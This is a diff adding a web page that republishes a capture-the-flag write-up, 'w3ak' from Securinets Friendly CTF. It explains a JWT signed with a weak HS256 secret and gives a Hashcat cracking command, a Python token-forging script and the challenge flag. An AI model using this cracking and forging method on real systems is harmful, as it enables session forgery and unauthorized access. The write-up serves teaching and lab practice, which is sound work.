@@ -1,0 +1,76 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#100d0b">
+  <meta name="description" content="The site uses a JWT to remember game progress. Its HMAC secret is a weak, publicly searchable value, so we can crack it with Hashcat and forge a winning token.">
+  <title>w3ak | Securinets Friendly CTF | rouma</title>
+  <link rel="icon" href="../images/favicon.svg" type="image/svg+xml">
+  <link rel="stylesheet" href="../css/style.css">
+  <script src="../js/main.js" defer></script>
+</head>
+<body>
+  <a class="skip-link" href="#article">Skip to article</a>
+  <header class="site-header">
+    <nav class="article-nav container" aria-label="Article navigation">
+      <a class="brand brand-signature" href="../index.html#home" aria-label="rouma, Home">rouma</a>
+      <a class="text-link" href="web-exploitation.html#securinets-friendly-ctf">&larr; Securinets Friendly CTF</a>
+    </nav>
+  </header>
+  <main id="article" class="article-main securinets-article container" tabindex="-1">
+    <p class="section-label">SECURINETS FRIENDLY CTF / WAVE 2 / EASY</p>
+    <h1>w3ak</h1>
+    <p class="template-notice">Original author: <strong>L-BOH</strong>. Shared for educational purposes; full credit goes to the original author. <a href="https://github.com/securinets-insat/Friendly-CTF-2026/blob/d4aa7b854bbc631b11313e6cba3edce0abb979c9/web-exp/wave2/jwt/writeup.md">Read the original writeup on GitHub</a>.</p>
+    <div class="writeup-content">
+<h2>Summary</h2>
+<p>The site uses a JWT to remember game progress. Its HMAC secret is a weak, publicly searchable value, so we can crack it with <code>Hashcat</code> and forge a winning token.</p>
+<h2>Root cause</h2>
+<p>The deployment sets the JWT key to the weak value gameking. The application then signs and trusts game status in the token:</p>
+<pre tabindex="0" aria-label="Code or command example"><code class="language-python">token = jwt.encode({'user_id': user[0], 'game-status': 'playing'},
+                   app.config['SECRET_KEY'], algorithm='HS256')
+...
+data = jwt.decode(token, app.config['SECRET_KEY'], algorithms=['HS256'])
+if data.get('game-status') == 'victory':
+    return render_template('game.html', message=f&quot;... {FLAG}&quot;)
+</code></pre>
+<p>HS256 uses the same secret to sign and verify. Once <code>Hashcat</code> finds the weak secret, an attacker can create a valid signature for a token whose game status is victory.</p>
+<h2>Vulnerability</h2>
+<p>After logging in, the browser receives an HS256 JWT cookie. The token payload includes a <code>game-status</code> value. HS256 only protects that data if its shared secret is strong and private; a short human-chosen secret can be recovered offline from the token signature.</p>
+<h2>Exploit</h2>
+<ol>
+<li>Register and log in with any account. Copy the value of the token cookie into <code>jwt.txt</code>.</li>
+<li>Crack it with <code>Hashcat</code> and the SecLists scraped JWT secrets wordlist:</li>
+</ol>
+<pre tabindex="0" aria-label="Code or command example"><code class="language-bash">hashcat -m 16500 jwt.txt /usr/share/seclists/Passwords/scraped-JWT-secrets.txt
+</code></pre>
+<p><code>Hashcat</code> recovers:</p>
+<pre tabindex="0" aria-label="Code or command example"><code class="language-text">gameking
+</code></pre>
+<ol start="3">
+<li>Sign a replacement token with a victory game status. Use the ID of an account that exists; ID 1 is convenient if you registered first.</li>
+</ol>
+<pre tabindex="0" aria-label="Code or command example"><code class="language-python">import datetime
+import jwt
+
+claims = {
+    &quot;user_id&quot;: 1,
+    &quot;username&quot;: &quot;attacker&quot;,
+    &quot;game-status&quot;: &quot;victory&quot;,
+    &quot;iat&quot;: datetime.datetime.utcnow(),
+    &quot;exp&quot;: datetime.datetime.utcnow() + datetime.timedelta(hours=1),
+}
+print(jwt.encode(claims, &quot;gameking&quot;, algorithm=&quot;HS256&quot;))
+</code></pre>
+<p>or just use jwt.io to forge the token.</p>
+<ol start="4">
+<li>Replace the token cookie with the generated value and revisit <code>/game.</code> The forged game status is accepted and the flag is displayed.</li>
+</ol>
+<h2>Flag</h2>
+<pre tabindex="0" aria-label="Code or command example"><code class="language-text">Securinets{n3ver_use_w3ak_jwt_secre7}
+</code></pre>
+    </div>
+    <p class="article-back"><a href="web-exploitation.html#securinets-wave2">&larr; Back to Wave 2 writeups</a></p>
+  </main>
+</body>
+</html>
